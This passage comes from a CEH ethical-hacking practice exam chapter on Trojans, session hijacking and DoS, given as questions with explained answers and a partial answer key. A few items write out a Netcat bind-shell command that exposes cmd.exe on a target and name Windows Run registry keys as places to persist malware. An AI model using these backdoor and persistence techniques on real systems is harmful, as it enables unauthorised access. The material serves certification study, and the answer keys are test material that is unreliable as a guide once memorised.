
4. A 13. B 22. C

5. C 14. A 23. D

6. C 15. A 24. A

7. D 16. A, B, C, D 25. C

8. A 17. A 26. C

9. A, C, D 18. B

Chapter 10: Trojans and Other Attacks

235

10-ch10.indd 235 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

ANSWERS

A 1. Bart receives an e-mail that appears to be from his lawyer containing a ZIP file named
Courtdoc.zip. Bart double-clicks the ZIP file to open it, and a message stating “This
word document is corrupt” appears. In the background, a file named Courtdoc.zip.exe
runs and copies itself to the local APPDATA directory. It then begins beaconing to an
external server. Which of the following best describes the malware Bart installed?

A. Worm

B. Virus

C. Trojan

D. Macro

☑ C. The definition of a Trojan is a non-self-replicating program that appears to have
a useful purpose but in reality has a different, malicious purpose. In other words, it
looks harmless but, when activated, is not. This is precisely what is going on in this
example. E-mail is not the only method to spread a Trojan, but phishing certainly
does seem to work well.

☐✗ A is incorrect because this does not describe a worm. A worm is a self-replicating,
self-propagating, self-contained program that uses networking mechanisms to spread
itself.

☐✗ B is incorrect because this does not describe a virus. A virus is a malicious computer
program with self-replication capabilities that attaches to another file and moves with
the host from one computer to another.

☐✗ D is incorrect because this does not describe a macro. A macro is a single instruction
that expands automatically into several instructions to perform a specific task (usually
associated with Microsoft Office products, as far as your exam is concerned).

2. You have established a Netcat connection to a target machine. Which flag can be used to
launch a program?

A. -p

B. -a

C. -l

D. -e

☑ D. Netcat is often referred to as the Swiss Army knife of hacking efforts. You can
use it to set up a listening port on target machines that you can then revisit to wreak
all sorts of havoc. The flag associated with launching a program is -e. For example,
issuing the command
nc –L –p 12657 –t –e cmd.exe

will open a Windows command shell on the target machine; the -t flag sets up a
Telnet connection over the port you defined with the -p flag (12657).

CEH Certified Ethical Hacker Practice Exams

236

10-ch10.indd 236 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

☐✗ A is incorrect because the -p flag indicates the protocol port you want to use for
your session.

☐✗ B is incorrect because -a is not a recognized Netcat flag.

☐✗ C is incorrect because the -l flag indicates Netcat should open the port for listening.
As an aside, the -L flag does the same thing; however, it restarts listening after the
inbound session completes.

3. Claire is surfing the Web and, after some time, a message pops up stating her system
has been infected by malware and offering a button to click for removal of the virus.
After she clicks the button, another message window appears stating the system has been
quarantined due to the nature of the infection and provides a link with instructions
to pay in order to regain control and to clear the virus. Which of the following best
describes this infection?

A. Spyware

B. Ransomware

C. Trojan

D. Adware

☑ B. The name ransomware gives away its purpose: the malware infects your system
and then restricts access to your files and folders, demanding a ransom payment
to get control back. ECC lists five different ransomware families: Cryptorbit,
Cryptolocker, Cryptodefense, Cryptowall, and police-themed. Usually the online
payment involves bitcoin, but it can take other avenues. In any case, never pay off the
attacker—you’re only signing yourself up for future terror. Cleaning off ransomware
may involve booting into Safe Mode, or even using a system restore on Windows
systems. You may even get away with an external AV scan as a fix action, but be sure
to scrub the system for hidden files and folders the ransomware may have left behind.
Lastly, I can’t overstate enough the value of good, solid, dependable backups. Even if
you’re foolish enough to pay the ransom, there is no guarantee any of your files will
remain accessible after the “unlock”—and could you trust them anyway? Invest in
good backups and run them religiously.

☐✗ A is incorrect because this does not describe spyware. Spyware is a type of malware
that covertly collects information about a user.

☐✗ C is incorrect because this does not describe a Trojan. A Trojan is a non-self-
replicating program that appears to have a useful purpose but in reality has a
different, malicious purpose.

☐✗ D is incorrect because this does not describe adware. Adware is software that has
advertisements embedded within it. It generally displays ads in the form of pop-ups.

Chapter 10: Trojans and Other Attacks

237

10-ch10.indd 237 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

4. Matty is examining malware as part of a security effort. She performs analysis of the malware
executable without running or installing it. Instead, she examines source and binary code to
find data structures, function calls, and other indicators of malicious behavior. Which of the
following best describes the type of malware analysis Matty is performing?

A. Static

B. Dynamic

C. File fingerprinting

D. Code emulation

☑ A. EC-Council defines two main types of malware analysis—static and dynamic.
In static analysis, the examiner never actually installs or executes the malware. It’s
considered a “safe” analysis, as the suspect file isn’t installed or allowed to execute;
however, as this is obviously a touchy area, it’s always a best and recommended
practice to perform analysis in a closed environment. This is largely a manual process,
but there are static analysis tools that can assist.

☐✗ B is incorrect because dynamic analysis is the process of examining malware behavior
by actually installing and running it in a monitored environment.

☐✗ C is incorrect because file fingerprinting involves computing a hash value for a given
binary code.

☐✗ D is incorrect because code emulation is a detection method where antivirus executes
the malicious codes on a virtual machine to simulate CPU and memory activities.

5. Pen test team member Amy attempts to guess the ISN for a TCP session. Which attack is
she most likely carrying out?

A. XSS

B. Session splicing

C. Session hijacking

D. Multipartite attack

☑ C. The idea behind session hijacking is fairly simple: the attacker waits for a session to
begin and, after all the pesky authentication gets done, jumps in to steal the session for
herself. In practice, it’s a little harder and more complicated than that, but the key to the
whole attack is in determining the initial sequence number (ISN) used for the session. The
ISN is sent by the initiator of the session in the first step (SYN). This is acknowledged in
the second step of the handshake (SYN/ACK) by incrementing that ISN by 1, and then
another ISN is generated by the recipient. This second number is acknowledged by the
initiator in the third step (ACK), and from there on out communication can occur. Per
EC-Council, the following steps describe the session hijack:

1. Sniff the traffic between the client and the server.

2. Monitor the traffic and predict the sequence numbering.

3. Desynchronize the session with the client.

CEH Certified Ethical Hacker Practice Exams

238

10-ch10.indd 238 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

4. Predict the session token and take over the session.

5. Inject packets to the target server.

For what it’s worth, pulling this attack off via EC-Council’s take on the whole matter
requires you to do some fairly significant traffic sniffing. And if you’re already positioned
to sniff the traffic in the first place, wouldn’t the whole scenario possibly be a moot point?
You need to know it for the exam, but real-world application may be rare.

☐✗ A is incorrect because cross-site scripting is a web application attack.

☐✗ B is incorrect because session splicing is an IDS evasion method. The attacker delivers
a payload that the IDS would have otherwise seen by “slicing” it over multiple
packets. The payload can be spread out over a long period of time.

☐✗ D is incorrect because multipartite refers to a virus type, not an attack that requires
ISN determination.

6. An attacker wants to make his malware as stealthy and undetectable as possible. He
employs an effort that uses compression to reduce the file size of the malware. Which of
the following best describes this?

A. Crypter

B. Wrapper

C. Packer

D. Compressor

☑ C. A packer uses compression to pack the malware executable into a smaller size.
Not only does this reduce the file size, but it serves to make the malware harder to
detect for some antivirus engines. While it can be compared to a ZIP file, there are
differences. For one example, the extraction occurs in memory and not on the disk.
But the primary difference between a packer and a general compression routine like
.zip is that a packer inflates/restores at runtime and on binary files (versus the more
generic compression offered by .zip).

☐✗ A is incorrect because a crypter is a software tool that uses a combination of encryption
and code manipulation to render malware undetectable to AV and other security
monitoring products (in Internet lingo, it’s referred to as fud, for “fully undetectable”).

☐✗ B is incorrect because a wrapper is used to bind a Trojan and a legitimate program
together so the Trojan will be installed when the legitimate program is executed.

☐✗ D is included merely as a distractor and is not a legitimate term.

7. Which of the following best describes a type of network attack whereby an attacker gains
access to your network and remains undetected for a long time period?

A. Fileless malware

B. Zombie

C. Fraggle

D. APT

Chapter 10: Trojans and Other Attacks

239

10-ch10.indd 239 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

☑ D. NIST defines advanced persistent threat (APT) this way: “An adversary with
sophisticated levels of expertise and significant resources, allowing it through the
use of multiple different attack vectors (e.g., cyber, physical, and deception) to
generate opportunities to achieve its objectives, which are typically to establish and
extend footholds within the information technology infrastructure of organizations for
purposes of continually exfiltrating information and/or to undermine or impede critical
aspects of a mission, program, or organization, or place itself in a position to do so in
the future; moreover, the advanced persistent threat pursues its objectives repeatedly
over an extended period of time, adapting to a defender’s efforts to resist it, and with
determination to maintain the level of interaction needed to execute its objectives.”

I don’t know about you, but that wall of text reminds me of the agreement contract
you have to accept before using your iPhone.

What this really means is APTs are bad guys (oftentimes well-funded, nation-state
attackers) who have found a way into your systems and have stayed around for a
long time. APTs are a nightmare from an incident response (IR) position, as tracking
down the initial attack vector, how long they’ve been around, and how much they’ve
had access to is next to impossible.

☐✗ A is incorrect because fileless malware infects legitimate software to carry out
malicious activities by leveraging existing vulnerabilities.

☐✗ B is incorrect because the term zombie refers to a system designed to respond as part
of a botnet.

☐✗ C is incorrect because in a fraggle attack, spoofed IP and Echo requests are sent to the
broadcast address using UDP packets.

8. An attacker makes use of the Beacon implant on a target system to hijack a browser
session. Which of the following best describes this attack?

A. Man in the browser

B. Man in the middle

C. Man in the pivot

D. IE hijacking

☑ A. Most have heard of session hijacking and man in the middle, but what about man
in the browser? A man-in-the-browser (MITB) attack occurs when the hacker sends
a Trojan to intercept browser calls. The Trojan basically sits between the browser and
libraries, allowing a hacker to watch, and interact within, a browser session. Cobalt
Strike—created by Raphael Mudge—added this feature a couple years back. If you
have his Beacon (the name of his implant) on a box, you can “browser pivot” such
that all of the target’s active sessions become your own. All of them. It effectively
sets up a local proxy port so you can point your browser to it, and it directs all your
requests through the Beacon on the target machine. Now you’re browsing in your
own browser as the target, without them even knowing it.

CEH Certified Ethical Hacker Practice Exams

240

10-ch10.indd 240 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

☐✗ B is incorrect because this does not necessarily describe a man-in-the-middle (MITM)
attack, which is an attack where the hacker positions himself between the client and
the server to intercept (and sometimes alter) data traveling between the two.

☐✗ C and D are incorrect because these are not legitimate terms.

9. Claire’s Windows system at work begins displaying strange activity, and she places a call
to the IT staff. On investigation, it appears Claire’s system is infected with several viruses.
The IT staff removes the viruses by deleting several file and folder locations and using
an AV tool and then reconnects the machine to the network. Later in the day, Claire’s
system again displays strange activity and the IT staff is called once again. Which of the
following are likely causes of the reinfection? (Choose all that apply.)

A. Claire revisits a malicious website.

B. Claire opens her Microsoft Outlook e-mail client and newly received e-mail is loaded
to her local folder (.pst file).

C. Claire uses a system restore point to regain access to deleted files and folders.

D. Claire uses the organization’s backup application to restore files and folders.

☑ A, C, D. Virus removal can be tricky, especially if nobody knows how and when
the virus got on the system in the first place. As a matter of fact, in many places I’ve
worked, discovering the source of the virus is as important as cleaning the system
in the first place. Cleaning a virus off the system usually involves scrubbing the
Microsoft registry, deleting files and folders (don’t forget to check for hidden ones),
and a host of other details and actions. Sometimes AV removal applications can help
with this process, but sometimes it’s an involved, manual process.

Even with tools to help in removal, administrators can’t afford to overlook system
restore points, backups, and user behavior. If a virus is on a system during a system
restore copy action, then any restoration of that point will reinstall the virus. The
same thing goes for data backups themselves—it should follow that an infected file
while being backed up will remain infected during the restore action. As for user
behavior, if the user is re-infected immediately following a specific website visit, or
after using a USB (or other removable media), at least you can pinpoint the source
and hopefully stop it from happening again.

☐✗ B is incorrect because new e-mail from the server wouldn’t necessarily be the cause of
the original infection.

10. In regard to Trojans, which of the following best describes a wrapper?

A. The legitimate file the Trojan is attached to

B. A program used to bind the Trojan to a legitimate file

C. A method of obfuscation using compression

D. A software tool that uses encryption and code manipulation to hide malware

Chapter 10: Trojans and Other Attacks

241

10-ch10.indd 241 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

☑ B. Wrappers are programs that allow you to bind an executable of your choice (Trojan)
to an innocent file your target won’t mind opening. For example, you might use a
program such as EliteWrap to embed a backdoor application with a game file (.exe).
A user on your target machine then opens the latest game file (maybe to play a hand
of cards against the computer or to fling a bird at pyramids built by pigs) while your
backdoor is installing and sits there waiting for your use later. As an aside, many
wrappers themselves are considered malicious and will show up on any up-to-date
virus signature list.

☐✗ A is incorrect because the wrapper is not the legitimate file the malware is bound to.

☐✗ C is incorrect because this describes a packer.

☐✗ D is incorrect because this describes a crypter.

11. In May 2017, this ransomware took advantage of a Windows SMB vulnerability known as
the Eternal Blue exploit and spread worldwide in a matter of hours. A hidden kill switch
inside the coding was quickly discovered, halting its spread. Which of the following best
fits this description?

A. Petya

B. WannaCry

C. Zeus

D. Botnet

☑ B. WannaCry was one of the fastest spreading, most dangerous ransomware variants
of all time. Taking advantage of Eternal Blue (interestingly enough, an exploit
discovered by and shared from the NSA), WannaCry spread to systems worldwide
in a matter of hours, demanding ransom payment in bitcoin. Despite patching
being available, due to many and varied reasons, multiple millions of systems were
unpatched and unprepared for the attack. A built-in kill switch—sending a reply
packet to a nonexistent domain, which was registered by a researcher to stop the
spread—was discovered within days.

☐✗ A is incorrect because Petya—while also exploiting Eternal Blue—had a few differences
with its WannaCry sibling. Petya, in large measure, appeared to be ransomware you
couldn’t pay off. Given its release, appearance, and general exclusivity (at least initially)
in Ukraine, speculation was that it was more of a politically motivated and destructive
type of malware than a legitimate ransomware effort.

☐✗ C is incorrect because Zeus is a banking Trojan.

☐✗ D is incorrect because botnet refers to a group of zombie systems controlled by an
attacker.

12. Which of the following is a legitimate communication path for the transfer of data?

A. Overt

B. Covert

CEH Certified Ethical Hacker Practice Exams

242

10-ch10.indd 242 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

C. Authentic

D. Imitation

E. Actual

☑ A. This is another one of those easy, pure-definition questions you simply can’t
miss on your exam. Whether it’s inside a computer, between systems, or across the
Internet, any legitimate channel used for communications and data exchange is
known as an overt channel. And don’t let the inherit risk with any channel itself make
the decision for you—even if the channel itself is a risky endeavor, if it is being used
for its intended purpose, it’s still overt. For example, an IRC or a gaming link is still
an overt channel, so long as the applications making use of it are legitimate. Overt
channels are legitimate communication channels used by programs across a system or
a network, whereas covert channels are used to transport data in ways they were not
intended for.

☐✗ B is incorrect because a covert channel, per EC-Council’s own definition, is “a channel
that transfers information within a computer system or network in a way that violates
security policy.” For example, a Trojan might create a channel for stealing passwords or
downloading sensitive data from the machine.

☐✗ C, D, and E are incorrect because none of these is a term for the communications
channel; they are included here as distractors.

13. In what layer of the OSI reference model is session hijacking carried out?

A. Data Link layer

B. Transport layer

C. Network layer

D. Physical layer

☑ B. If you think about a session hijack, this makes sense. Authentication has already
occurred, so we know both computers have already found each other. Therefore,
the Physical, Data Link, and Network layers have already been eclipsed. And what
is being altered and played with in these hijacking attempts? Why, the sequence
numbers, of course, and sequencing occurs at the Transport layer. Now, for all
you real-world folks out there screaming that communications can be, and truly
are, hijacked at every level, let me caution your outrage with something I’ve said
repeatedly throughout this book: sometimes the exam and reality are two different
things, and if you want to pass the test, you’ll need to memorize this the way
EC-Council wants you to. Session hijacking is taught in CEH circles as a measure of
guessing sequence numbers, and that’s a Transport layer entity. In the real world, your
Physical layer interception of a target would result in access to everything above, but
on the exam just stick with “session hijacking = Transport layer.”

☐✗ A, C, and D are incorrect because these layers are not where a session hijack attack is
carried out.

Chapter 10: Trojans and Other Attacks

243

10-ch10.indd 243 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

14. A pen test team member types the following command:
nc222.15.66.78 –p 8765

Which of the following statements is true regarding this attempt?

A. The attacker is attempting to connect to an established listening port on a remote
computer.

B. The attacker is establishing a listening port on his machine for later use.

C. The attacker is attempting a DoS against a remote computer.

D. The attacker is attempting to kill a service on a remote machine.

☑ A. As stated earlier, Netcat is a wonderful tool that allows remote access wizardry
on a machine, and you’ll need to be able to recognize the basics of the syntax. In
the command example, Netcat is being told, “Please attempt a connection to the
machine with the IP address of 222.15.66.78 on port 8765; I believe you’ll find the
port in a listening state, waiting for our arrival.” Obviously, at some point previous
to issuing this command on his local machine, the pen tester planted the Netcat
Trojan on the remote system (222.15.66.78) and set it up in a listening state. He may
have set it up with command-shell access (allowing a Telnet-like connection to issue
commands at will) using the following command:
nc –L –p 8765 –t –e cmd.exe

☐✗ B is incorrect because this command is issued on the client side of the setup, not the
server side. At some point previously, the port was set to a listening state, and this
Netcat command will access it.

☐✗ C is incorrect because this command is not attempting a denial of service against the
target machine. It’s included here as a distractor.

☐✗ D is incorrect because this command is not attempting to kill a process or service on
the remote machine. It’s included here as a distractor.

15. Examine the partial command-line output listed here:
Active Connections
Proto Local Address Foreign Address State

TCP 0.0.0.0:912 COMPUTER11:0 LISTENING
TCP 0.0.0.0:3460 COMPUTER11:0 LISTENING
TCP 0.0.0.0:3465 COMPUTER11:0 LISTENING
TCP 0.0.0.0:8288 COMPUTER11:0 LISTENING
TCP 0.0.0.0:16386 COMPUTER11:0 LISTENING
TCP 192.168.1.100:139 COMPUTER11:0 LISTENING
TCP 192.168.1.100:58191 173.194.44.81:https ESTABLISHED
TCP 192.168.1.100:58192 173.194.44.81:https TIME_WAIT
TCP 192.168.1.100:58193 173.194.44.81:https TIME_WAIT
TCP 192.168.1.100:58194 173.194.44.81:https ESTABLISHED
TCP 192.168.1.100:58200 bk-in-f138:http TIME_WAIT

CEH Certified Ethical Hacker Practice Exams

244

10-ch10.indd 244 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

Which of the following is a true statement regarding the output?

A. This is output from a netstat -an command.

B. This is output from a netstat -b command.

C. This is output from a netstat -e command.

D. This is output from a netstat -r command.

☑ A. You’ll need to get to know Netstat before your exam. It’s not a huge thing, and
you won’t get bogged down in minutiae, but you do need to know the basics.
Netstat is a great command-line tool built into every Microsoft operating system.
From Microsoft’s own description, Netstat “displays active TCP connections, ports
on which the computer is listening, Ethernet statistics, the IP routing table, IPv4
statistics (for the IP, ICMP, TCP, and UDP protocols), and IPv6 statistics (for the
IPv6, ICMPv6, TCP over IPv6, and UDP over IPv6 protocols).” It’s a great, easy way
to see which ports you have open on your system, helping you to identify any Trojans
that may be hanging around. A netstat -an command will show all connections and
listening ports in numerical form.

☐✗ B is incorrect because the -b option displays the executable involved in creating each
connection or listening port. Its output appears something like this:
Proto Local Address Foreign Address State

TCP 127.0.0.1:5354 COMPUTER11:49155 ESTABLISHED
[mDNSResponder.exe]

TCP 127.0.0.1:27015 COMPUTER11:49175 ESTABLISHED
[AppleMobileDeviceService.exe]

TCP 127.0.0.1:49155 COMPUTER11:5354 ESTABLISHED
[AppleMobileDeviceService.exe]

TCP 127.0.0.1:49175 COMPUTER11:27015 ESTABLISHED
[iTunesHelper.exe]

☐✗ C is incorrect because the -e flag displays Ethernet statistics for the system. The output
appears something like this:

Received Sent
Bytes 125454856 33551337
Unicast packets 164910 167156
Non-unicast packets 570 15624
Discards 0 0
Errors 0 268
Unknown protocols 0

☐✗ D is incorrect because the -r flag displays the route table for the system. Here’s a
sampling of the output:
IPv4 Route Table
====================================================================
Active Routes:
Network Destination Netmask Gateway Interface Metric

0.0.0.0 0.0.0.0 192.168.1.1 192.168.1.100 25
15.0.0.0 255.0.0.0 On-link 16.213.104.24 26

15.195.201.216 255.255.255.255 192.168.1.1 192.168.1.100 26
15.255.255.255 255.255.255.255 On-link 16.213.104.24 281

Chapter 10: Trojans and Other Attacks

245

10-ch10.indd 245 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

16. You are discussing malware with a new pen test member who asks about restarting
executables. Which registry keys within Windows automatically run executables and
instructions? (Choose all that apply.)

A. HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
RunServicesOnce

B. HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
RunServices

C. HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
RunOnce

D. HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run

☑ A, B, C, D. Creating malware and infecting a machine with it is accomplishing
only the basics. Getting it to hang around by having it restart when the user
reboots the machine? Now we’re talking. The Run, RunOnce, RunServices, and
RunServicesOnce registry keys within the HKEY_LOCAL_MACHINE hive
are great places to stick executables. Because of this, it’s helpful to run registry
monitoring on occasion to check for anything suspicious. Sys Analyzer, Regshot, and
TinyWatcher are all options for this.

17. Which of the following is a true statement?

A. Sequence prediction attacks are specific to TCP.

B. Using a protocol in a way it is not intended to be used is an example of an overt channel.

C. All DoS and DDoS attacks are specific to TCP.

D. Fraggle is a TCP-based attack.

☑ A. Sequence prediction attacks are specific to TCP because TCP uses sequence
numbers. Unlike the fire-and-forget method employed by UDP, TCP uses sequence
numbers and windowing to keep track of conversations. Sequence prediction is a
session hijacking procedure where the attacker guesses the next sequence number
and launches himself into the data connection between client and server.

☐✗ B is incorrect because this is an example of a covert channel.

☐✗ C is incorrect because not all DoS and DDoS attacks are TCP based.

☐✗ D is incorrect because fraggle is a UDP-based DoS attack.

18. Which denial-of-service attack involves using multiple intermediary and secondary
machines to contribute to the DoS effort?

A. SYN flood

B. DRDoS

C. Application-level flood

D. LOIC

CEH Certified Ethical Hacker Practice Exams

246

10-ch10.indd 246 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

☑ B. A distributed reflection denial-of-service (DRDoS) attack is also known as a
“spoofed” attack and makes use of multiple intermediary and secondary machines.
The bad guy sends attack information to the intermediary machines, which, in turn,
send the messages out to the secondary machines. This makes tracking the real source
of the attack very difficult to determine (the investigators will see and react to the
secondaries, not the originator).

☐✗ A is incorrect because a SYN flood takes advantage of tons of half-open connections
and does not use intermediary systems.

☐✗ C is incorrect because an application-level flood is a DoS action that floods
applications or disrupts application–database communications.

☐✗ D is incorrect because Low Orbit Ion Cannon (LOIC) is a simple-to-use DDoS tool
that floods a target with TCP, UDP, or HTTP requests. It was originally written as
open source to attack various Scientology websites but has since had many people
voluntarily joining a botnet to support a variety of attacks. LOIC was once used in a
coordinated attack against Sony’s PlayStation network, and the tool has a track record
of other successful hits: the Recording Industry Association of America, PayPal,
MasterCard, and several other companies have all fallen victim to LOIC.

19. Which of the following best describes malware that infects legitimate software using
existing vulnerabilities to carry out malicious activities?

A. Fileless malware

B. APT

C. Dynamic analysis

D. Ping of death

☑ A. In reading about fileless malware, I came across a description that said it was also
known as “non-malware.” While that did elicit a chuckle from me, the real point in
it is very true: fileless malware isn’t necessarily like a virus or Trojan you can find,
examine, and block with an AV system. Fileless malware is an effort to leverage
existing vulnerabilities to get legitimate services on your system to carry out the bad
guy’s wishes. Residing in RAM, fileless malware injects code into all sorts of running
processes.

☐✗ B is incorrect because advanced persistent threat refers to a successful attack that
remains embedded in the environment, undetected, while monitoring and malicious
activities are being carried out.

☐✗ C is incorrect because dynamic analysis refers to an effort to analyze malware actively
running on a system.

☐✗ D is incorrect because the ping of death attack involves sending a ping request with
an unusually large payload. The ping would be fragmented and, when put together,
would kill the target machine.

Chapter 10: Trojans and Other Attacks

247

10-ch10.indd 247 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

20. IPSec is an effective preventative measure against session hijacking. Which IPSec mode
encrypts only the data payload?

A. Transport

B. Tunnel

C. Protected

D. Spoofed

☑ A. IPSec is a wonderful encryption mechanism that can rather easily be set up
between two endpoints or even across your entire subnet if you configure the hosts
appropriately. You won’t need to know all the bells and whistles with IPSec for the
exam (and thank goodness, because there’s a lot to write about), but you do need
to know the basics. Transport mode does not affect the header of the packet at all
and encrypts only the payload. It’s typically used as a secured connection between
two endpoints, whereas Tunnel mode creates a VPN-like connection protecting the
entire session. Additionally, Transport mode is compatible with conventional network
address translation (NAT).

☐✗ B is incorrect because Tunnel mode encapsulates the entire packet, including the
header. This is typically used to form a VPN connection, where the tunnel is used
across an untrusted network (such as the Internet). For pretty obvious reasons, it’s
not compatible with conventional NAT; when the packet goes through the router
(or whatever is performing NAT for you), the source address in the packet changes
because of Tunnel mode and, therefore, invalidates the packet for the receiving end.
There are workarounds for this, generally lumped together as NAT traversal (NAT-t).
Many home routers take advantage of something referred to as IPSec passthrough to
allow just this.

☐✗ C and D are incorrect because they are invalid terms in the context of IPSec.

21. What provides for both authentication and confidentiality in IPSec?

A. AH

B. IKE

C. OAKLEY

D. ESP

☑ D. Encapsulation Security Payload (ESP) is a member of the IPSec protocol suite,
and it provides data authentication (proving the data is actually from who it’s
supposed to be from) and confidentiality (by encrypting the data). In Transport
mode, ESP doesn’t provide integrity and authentication for the entirety of the packet,
but it does in Tunnel mode (excluding the outer IP header, of course).

CEH Certified Ethical Hacker Practice Exams

248

10-ch10.indd 248 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

☐✗ A is incorrect because Authentication Header (AH) provides authentication but not
encryption.

☐✗ B is incorrect because Internet Key Exchange (IKE) is a protocol that produces the
security keys.

☐✗ C is incorrect because OAKLEY is a protocol used to create a master key as well as a
key specific to each session in the data transfer. It makes use of the Diffie-Hellman
algorithm for this process.

22. Which of the following statements best describes the comparison between spoofing and
session hijacking?

A. Spoofing and session hijacking are the same thing.

B. Spoofing interrupts a client’s communication, whereas hijacking does not.

C. Hijacking interrupts a client’s communication, whereas spoofing does not.

D. Hijacking emulates a foreign IP address, whereas spoofing refers to MAC addresses.

☑ C. Hijacking and spoofing can sometimes be confused with each other, although they
really shouldn’t be. Spoofing refers to a process where the attacking machine pretends
to be something it is not. Whether by faking a MAC address or an IP address, the
idea is that other systems on the network will communicate with your machine
(that is, set up and tear down sessions) as if it’s the target system. Generally this is
used to benefit sniffing efforts. Hijacking is a totally different animal. In hijacking,
the attacker jumps into an already existing session, knocking the client out of it and
fooling the server into continuing the exchange. In many cases, the client will simply
reconnect to the server over a different session, with no one the wiser: the server isn’t
even aware of what happened, and the client simply connects again in a different
session. As an aside, EC-Council describes session hijacking as using these steps:

1. Sniff the traffic between the client and the server.

2. Monitor the traffic and predict the sequence numbering.

3. Desynchronize the session with the client.

4. Predict the session token and take over the session.

5. Inject packets to the target server.

☐✗ A is incorrect because spoofing and hijacking are different. An argument can be made
that hijacking makes use of some spoofing, but the two attacks are separate entities:
spoofing pretends to be another machine, eliciting (or setting up) sessions for sniffing
purposes, whereas hijacking takes advantage of existing communications sessions.

☐✗ B is incorrect because spoofing doesn’t interrupt a client’s existing session at all; it’s
designed to sniff traffic and/or set up its own sessions.

☐✗ D is incorrect because spoofing isn’t relegated to MAC addresses only. You can spoof
almost anything, from MAC and IP addresses to system names and services.

Chapter 10: Trojans and Other Attacks

249

10-ch10.indd 249 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

23. Which of the following is an effective deterrent against TCP session hijacking?

A. Install and use an HIDS on the system.

B. Install and use Tripwire on the system.

C. Enforce good password policy.

D. Use unpredictable sequence numbers.

☑ D. As noted already, session hijacking requires the attacker to guess the proper
upcoming sequence number(s) to pull off the attack, pushing the original client out
of the session. Using unpredictable session IDs (or, better stated in the real world,
using a modern operating system with less predictable sequence numbers) in the first
place protects against this. Other countermeasures for session hijacking are fairly
common sense: use encryption to protect the channel, limit incoming connections,
minimize remote access, and regenerate the session key after authentication is
complete. And, lastly, don’t forget user education: if the users don’t know any better,
they might not think twice about clicking past the security certificate warning or
reconnecting after being suddenly shut down.

☐✗ A is incorrect because a host-based intrusion detection system may not deter session
hijacking at all.

☐✗ B is incorrect because Tripwire is a file integrity application and won’t do a thing for
session hijacking prevention.

☐✗ C is incorrect because system passwords have nothing to do with session hijacking.

24. Which of the following is a group of Internet computers set up to forward transmissions
to other computers on the Internet without the owner’s knowledge or permission?

A. Botnet

B. Zombie

C. Honeypot

D. DDoS

☑ A. A botnet is a group of systems an attacker has control over, without the owner’s
knowledge or permission. Each zombie system in the network sends messages and
data transmissions for the botnet controller—everything from spam and e-mail to
viruses and ads. Although they are probably best known for their roles in distributed
denial-of-service attacks, botnets can be used for a variety of activities. As an aside,
ECC maintains that botnets are most commonly controlled via IRC (Internet Relay
Chat), but in the real world they can be controlled by a host of methods.

☐✗ B is incorrect because, while a botnet is made up of zombie computers, a single
zombie does not make up a botnet.

CEH Certified Ethical Hacker Practice Exams

250

10-ch10.indd 250 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

☐✗ C is incorrect because a honeypot is a system set up specifically to be hacked so that
security staff can watch what an attacker is doing.

☐✗ D is incorrect because a distributed denial-of-service attack may be carried out by a
botnet, but it does not define one.

25. Which of the following best describes a process for discovering the hash value for a given
binary code?

A. String searching

B. Dependency walking

C. File fingerprinting

D. Port monitoring

☑ C. File fingerprinting is a function in malware analysis where binary code is run
through a hash to generate an identifying value. This can then be used to identify
other malware packages, or see if any changes are made to the one you’re examining.

☐✗ A is incorrect because string searching refers to a function in malware analysis where
embedded strings of readable text in malicious code are analyzed.

☐✗ B is incorrect because in dependency walking, the malware analyzer builds
hierarchical diagrams of all the dependent modules of the malware.

☐✗ D is incorrect because in port monitoring, the malware analyzer uses port
monitoring tools to examine which ports the malware is attempting to use.

26. When is session hijacking performed?

A. Before the three-step handshake

B. During the three-step handshake

C. After the three-step handshake

D. After a FIN packet

☑ C. This question should be an easy one for you, but it’s included here to reinforce
the point that you need to understand session hijacking steps well for the exam. Of
course, session hijacking should occur after the three-step handshake. As a matter of
fact, you’ll probably need to wait quite a bit after the three-step handshake so that
everything on the session can be set up—authentication and all that nonsense should
be taken care of before you jump in and take over.

☐✗ A and B are incorrect because session hijacking occurs after a session is already
established, and the three-step handshake must obviously occur first for this to be true.

☐✗ D is incorrect because the FIN packet brings an orderly close to the TCP session.
Why on Earth would you wait until the session is over to start trying to hijack it?

Chapter 10: Trojans and Other Attacks

251

